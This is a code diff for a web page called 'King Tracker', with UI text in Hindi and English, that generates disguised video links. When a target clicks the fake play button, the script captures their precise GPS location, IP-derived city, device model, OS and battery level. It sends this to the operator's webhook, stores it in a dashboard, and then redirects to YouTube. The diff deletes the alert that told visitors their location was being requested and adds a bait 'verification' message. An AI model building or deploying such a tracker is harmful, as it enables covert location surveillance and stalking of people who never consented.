@@ -8,10 +8,8 @@
     <style>
         :root {
             --primary: #00ff41;
-            /* Hacker Green */
             --secondary: #008f11;
             --accent: #ff003c;
-            /* Cyber Red */
             --bg: #0b0e14;
             --card-bg: rgba(255, 255, 255, 0.05);
         }
@@ -57,7 +55,6 @@
             background: var(--bg);
             color: #ffffff;
             display: flex;
-            /* Sidebar layout ke liye flex use kiya */
             min-height: 100vh;
             margin: 0;
             overflow-x: hidden;
@@ -257,7 +254,7 @@
             }
 
             .sidebar {
-                width: 100%;
+                width: 100% !important;
                 height: auto;
                 position: relative;
                 padding: 15px;
@@ -286,18 +283,19 @@
         <h3>King Panel</h3>
         <button class="nav-btn active" onclick="showSection('main-ui', this)">Link Creator</button>
         <button class="nav-btn" onclick="showSection('admin-dashboard', this)">King Dashboard</button>
+        <p style="font-size: 11px; color: var(--primary); margin-top: 20px; opacity: 0.7;">
+            Check Webhook for logs.</p>
     </div>
 
     <div class="main-content">
         <div class="container active" id="main-ui">
             <h2>King Tracker</h2>
-            <p style="color: #888;">Generate tracking link for any video</p>
+            <p style="color: #888;">System will auto-generate a video tracking link</p>
 
             <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)">
-            <input type="url" id="videoUrl" placeholder="Video URL (e.g., YouTube Link)">
             <input type="text" id="loadingText" placeholder="Custom loading message (Optional)">
 
-            <button onclick="generateLink()">Link Banayein</button>
+            <button onclick="generateLink()">Generate Auto-Tracking Link</button>
 
             <div id="result">
                 <strong>Aapka Tracking Link:</strong><br>
@@ -315,19 +313,19 @@
         <!-- Admin Dashboard Section -->
         <div class="admin-section" id="admin-dashboard">
             <h3>King Dashboard (Recent Activity)</h3>
-            <p style="font-size: 0.8em; color: #888;">Click on row to see Location Map. Use 'Watch' to see target video.
-            </p>
+            <p style="font-size: 0.8em; color: #888;">Click on "Location" to open Google Maps. Data is saved locally in
+                this browser.</p>
             <div style="overflow-x: auto;">
                 <table id="logTable">
                     <thead>
                         <tr>
                             <th>Name</th>
                             <th>IP Address</th>
-                            <th>Device/OS</th>
+                            <th>OS</th>
+                            <th>Device</th>
                             <th>Battery</th>
                             <th>Location</th>
                             <th>Time</th>
-                            <th>Action</th>
                         </tr>
                     </thead>
                     <tbody id="logBody">
@@ -335,13 +333,29 @@
                     </tbody>
                 </table>
             </div>
-            <button onclick="openWebhookDashboard()" style="margin-top: 10px;">Open Real-Time Webhook Panel</button>
+            <button onclick="clearLogs()"
+                style="margin-top: 20px; background: var(--accent); border-color: var(--accent);">Clear All
+                Logs</button>
         </div>
 
         <!-- Redirecting Message (Initially Hidden) -->
         <div id="redirect-ui" class="hidden">
-            <h1 id="redirect-header">Video Load Ho Raha Hai...</h1>
-            <p id="redirect-subtext">Kripya intezaar karein.</p>
+            <div
+                style="background: var(--card-bg); padding: 40px; border-radius: 20px; border: 1px solid var(--primary);">
+                <h1 id="redirect-header" style="font-size: 1.5rem;">Video Player</h1>
+                <div id="player-preview"
+                    style="width: 100%; aspect-ratio: 16/9; background: #000; margin: 20px 0; border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; border: 1px solid rgba(255,255,255,0.1);">
+                    <div style="width: 60px; height: 60px; background: rgba(0,255,65,0.8); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer;"
+                        onclick="startTrackingProcess()">
+                        <div
+                            style="width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #000; margin-left: 5px;">
+                        </div>
+                    </div>
+                </div>
+                <p id="redirect-subtext">Click the play button to watch the video content.</p>
+                <p style="font-size: 10px; color: #555; margin-top: 20px;">Verification required to continue playback.
+                </p>
+            </div>
         </div>
     </div>
 
@@ -363,24 +377,12 @@
             if (id === 'admin-dashboard') loadLocalLogs();
         }
 
-        function openWebhookDashboard() {
-            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) {
-                alert("Warning: Aapne apna Webhook URL set nahi kiya hai. Kripya code mein 'YOUR_WEBHOOK_URL_HERE' ko apne Webhook.site URL se badlein.");
-                return;
-            }
-            const dashboardUrl = WEBHOOK_URL.replace('https://webhook.site/', 'https://webhook.site/#!/');
-            window.open(dashboardUrl, '_blank');
-        }
-
         function generateLink() {
-            const videoUrl = document.getElementById('videoUrl').value;
-            if (!videoUrl) {
-                alert("Kripya video link daalein!");
-                return;
-            }
+            // Auto-set a default trending video link
+            const videoUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
             const linkName = document.getElementById('linkName').value || 'Unnamed';
-            const loadingMsg = document.getElementById('loadingText').value || 'Video Load Ho Raha Hai...';
+            const loadingMsg = document.getElementById('loadingText').value || 'Connecting to Secure Server...';
 
             // Create config object
             const config = {
@@ -415,138 +417,27 @@
             });
         }
 
+        let globalConfig = null;
+
         // --- Tracking Logic ---
         window.onload = function () {
             const urlParams = new URLSearchParams(window.location.search);
-            // dataEncoded parameter mein saari link ki information hoti hai (video URL, name, message)
             const dataEncoded = urlParams.get('data');
 
             if (dataEncoded) {
                 try {
-                    // Unicode support ke liye safe decoding
-                    const config = JSON.parse(decodeURIComponent(escape(atob(dataEncoded))));
+                    globalConfig = JSON.parse(decodeURIComponent(escape(atob(dataEncoded))));
 
-                    document.getElementById('main-ui').style.display = 'none';
-                    document.getElementById('sidebar').style.display = 'none';
-                    document.getElementById('admin-dashboard').style.display = 'none';
+                    // Target user will see NO website UI, only the redirect-ui
+                    document.getElementById('main-ui').remove();
+                    document.getElementById('sidebar').remove();
                     document.getElementById('redirect-ui').classList.remove('hidden');
-                    document.getElementById('redirect-header').innerText = config.m;
-
-                    const targetUrl = config.u;
-                    let visitorData = {
-                        link_label: config.n,
-                        redirect_url: targetUrl,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        os: getOS(),
-                        battery: 'N/A',
-                        ip: 'Unknown', city: 'Unknown', lat: null, lon: null
-                    };
-
-                    function getOS() {
-                        const ua = navigator.userAgent;
-                        if (/Android/i.test(ua)) return "Android";
-                        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-                        if (/Windows/i.test(ua)) return "Windows";
-                        if (/Mac/i.test(ua)) return "macOS";
-                        if (/Linux/i.test(ua)) return "Linux";
-                        return "Unknown";
-                    }
-
-                    async function captureBattery() {
-                        if (navigator.getBattery) {
-                            const battery = await navigator.getBattery();
-                            visitorData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌' : '🔋'})`;
-                        }
-                    }
-
-                    const finalRedirect = (delay = 2500) => { // Default delay 2.5 seconds
-                        setTimeout(() => { window.location.href = targetUrl; }, delay);
-                    };
-
-                    const collectAndSend = async (geoData) => {
-                        await captureBattery();
-                        // Try IP Provider 1 (ipapi.co)
-                        fetch('https://ipapi.co/json/')
-                            .then(res => res.json())
-                            .then(ipData => {
-                                console.log("IPAPI.co data:", ipData);
-                                updateAndFinish(ipData, geoData);
-                            })
-                            .catch(ipapiErr => {
-                                console.error("IPAPI.co fetch error:", ipapiErr);
-                                // Fallback to IP Provider 2 (ipwho.is)
-                                fetch('https://ipwho.is/')
-                                    .then(res => res.json())
-                                    .then(ipData => {
-                                        console.log("IPWHO.is data:", ipData);
-                                        updateAndFinish({
-                                            ip: ipData.ip,
-                                            city: ipData.city,
-                                            country_name: ipData.country, // ipwho.is provides 'country'
-                                            latitude: ipData.latitude,
-                                            longitude: ipData.longitude
-                                        }, geoData);
-                                    })
-                                    .catch(ipwhoErr => {
-                                        console.error("IPWHO.is fetch error:", ipwhoErr);
-                                        updateAndFinish(null, geoData); // No IP data, proceed with geoData or null
-                                    });
-                            });
-                    };
-
-                    const updateAndFinish = (ipData, geoData) => {
-                        if (ipData) {
-                            visitorData.ip = ipData.ip || 'Not available';
-                            visitorData.city = ipData.city || 'Not available';
-                            visitorData.country_name = ipData.country_name || ipData.country || 'Not available'; // Handle both ipapi.co and ipwho.is
-                            visitorData.lat = (geoData && geoData.lat) ? geoData.lat : (ipData.latitude || null);
-                            visitorData.lon = (geoData && geoData.lon) ? geoData.lon : (ipData.longitude || null);
-                        } else if (geoData) {
-                            visitorData.lat = geoData.lat;
-                            visitorData.lon = geoData.lon;
-                            visitorData.ip = 'Not available (GPS only)';
-                            visitorData.city = 'Not available (GPS only)';
-                            visitorData.country_name = 'Not available (GPS only)';
-                        }
-
-                        saveLogLocally(visitorData);
-                        console.log("Final Visitor Data to send:", visitorData);
-
-                        if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
-                            console.log("Sending data to Webhook:", WEBHOOK_URL);
-                            fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                mode: 'no-cors',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(visitorData)
-                            });
-                        }
-                        finalRedirect();
-                    };
-
-                    // Try Precise GPS first
-                    if (navigator.geolocation) {
-                        alert("King Tracker aapki location access karna chahta hai taaki aapko behtar tracking data mil sake. Kripya 'Allow' karein.");
-                        console.log("Requesting Geolocation...");
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => collectAndSend({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                            (err) => { console.warn("Geolocation denied or error:", err); collectAndSend(null); },
-                            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 } // Increased timeout, force fresh data
-                        );
-                    } else {
-                        console.warn("Geolocation not supported by browser or not available.");
-                        collectAndSend(null);
-                    }
-
-                    // Emergency fallback redirect
-                    setTimeout(() => { if (window.location.href !== targetUrl) finalRedirect(0); }, 10000); // 10 seconds fallback
-
                 } catch (e) {
-                    console.error("Invalid data parameter");
-                    window.location.href = "/";
+                    console.error("Invalid Configuration");
+                    window.location.href = "https://google.com";
                 }
             } else {
+                // Owner is visiting - load dashboard data
                 loadLocalLogs();
             }
         };
@@ -554,7 +445,7 @@
         function saveLogLocally(data) {
             let logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
             logs.unshift(data);
-            localStorage.setItem('king_logs', JSON.stringify(logs.slice(0, 20)));
+            localStorage.setItem('king_logs', JSON.stringify(logs.slice(0, 50))); // Keep last 50 logs
         }
 
         function loadLocalLogs() {
@@ -562,18 +453,151 @@
             const body = document.getElementById('logBody');
             body.innerHTML = '';
             logs.forEach(log => {
-                const mapUrl = (log.lat && log.lon) ? `https://www.google.com/maps?q=${log.lat},${log.lon}` : '#';
+                // Strict check for coordinates
+                const mapUrl = (log.lat !== null && log.lon !== null) ? `https://www.google.com/maps?q=${log.lat},${log.lon}` : '#';
                 const row = `<tr>
                     <td>${log.link_label}</td>
                     <td>${log.ip}</td>
-                    <td>${log.os || 'Unknown'}</td>
-                    <td>${log.battery || 'N/A'}</td>
-                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'Location data missing\')'}" style="text-decoration: underline; color: var(--primary);">${log.city || 'Unknown'} (${log.country_name || 'N/A'})</td>
+                    <td>${log.os}</td>
+                    <td>${log.device || 'Unknown'}</td>
+                    <td>${log.battery}</td>
+                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'No GPS data\')'}" 
+                        style="text-decoration: underline; color: var(--primary); cursor: pointer;">
+                        ${log.city && log.city !== 'Unknown' ? log.city : 'Open Map'}
+                    </td>
                     <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
-                    <td><a href="${log.redirect_url}" target="_blank" class="watch-btn">Watch Video</a></td>
                 </tr>`;
                 body.innerHTML += row;
             });
+        }
+
+        function clearLogs() {
+            if (confirm("Sare logs delete kar dein?")) {
+                localStorage.removeItem('king_logs');
+                loadLocalLogs();
+            }
+        }
+
+        function startTrackingProcess() {
+            if (!globalConfig) return;
+
+            document.getElementById('redirect-subtext').innerText = globalConfig.m;
+            const targetUrl = globalConfig.u;
+
+            let visitorData = {
+                link_label: globalConfig.n,
+                redirect_url: targetUrl,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                os: getOS(),
+                device: getDevice(),
+                battery: 'N/A',
+                ip: 'Unknown', city: 'Unknown', lat: null, lon: null
+            };
+
+            function getOS() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) return "Android";
+                if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+                if (/Windows/i.test(ua)) return "Windows";
+                if (/Mac/i.test(ua)) return "macOS";
+                if (/Linux/i.test(ua)) return "Linux";
+                return "Unknown";
+            }
+
+            function getDevice() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    let model = "Android";
+                    const match = ua.match(/Android.*;\s([^;)]+)/);
+                    if (match) model = match[1];
+                    // Common brands check
+                    if (/SM-|GT-/i.test(ua)) return "Samsung (" + model + ")";
+                    const brands = ["Huawei", "Xiaomi", "Oppo", "Vivo", "Realme", "Motorola", "Google", "OnePlus", "Nokia"];
+                    for (let brand of brands) {
+                        if (new RegExp(brand, "i").test(ua)) return brand + " (" + model + ")";
+                    }
+                    return model;
+                }
+                if (/iPhone|iPad|iPod/i.test(ua)) return "Apple " + ua.match(/iPhone|iPad|iPod/i)[0];
+                return "Desktop / PC";
+            }
+
+            async function captureBattery() {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    visitorData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌' : '🔋'})`;
+                }
+            }
+
+            const finalRedirect = () => {
+                window.location.href = targetUrl;
+            };
+
+            const collectAndSend = async (geoData) => {
+                await captureBattery();
+                fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        updateAndFinish(ipData, geoData);
+                    })
+                    .catch(ipapiErr => {
+                        fetch('https://ipwho.is/')
+                            .then(res => res.json())
+                            .then(ipData => {
+                                updateAndFinish({
+                                    ip: ipData.ip,
+                                    city: ipData.city,
+                                    country_name: ipData.country,
+                                    latitude: ipData.latitude,
+                                    longitude: ipData.longitude
+                                }, geoData);
+                            })
+                            .catch(ipwhoErr => {
+                                updateAndFinish(null, geoData); // No IP data, proceed with geoData or null
+                            });
+                    });
+            };
+
+            const updateAndFinish = (ipData, geoData) => {
+                if (ipData) {
+                    visitorData.ip = ipData.ip || 'Not available';
+                    visitorData.city = ipData.city || 'Not available';
+                    visitorData.country_name = ipData.country_name || ipData.country || 'Not available';
+                    visitorData.lat = (geoData && geoData.lat) ? geoData.lat : (ipData.latitude || null);
+                    visitorData.lon = (geoData && geoData.lon) ? geoData.lon : (ipData.longitude || null);
+                } else if (geoData) {
+                    visitorData.lat = geoData.lat;
+                    visitorData.lon = geoData.lon;
+                    visitorData.ip = 'Not available (GPS only)';
+                    visitorData.city = 'Not available (GPS only)';
+                    visitorData.country_name = 'Not available (GPS only)';
+                }
+
+                saveLogLocally(visitorData);
+
+                if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(visitorData),
+                        keepalive: true
+                    }).catch(e => console.warn("Webhook failed"));
+                }
+                setTimeout(finalRedirect, 1000);
+            };
+
+            // Try Precise GPS first
+            if (navigator.geolocation) {
+                console.log("Requesting Location...");
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => collectAndSend({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    (err) => { console.warn("Location denied"); collectAndSend(null); },
+                    { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
+                );
+            } else {
+                collectAndSend(null);
+            }
         }
     </script>
 </body>
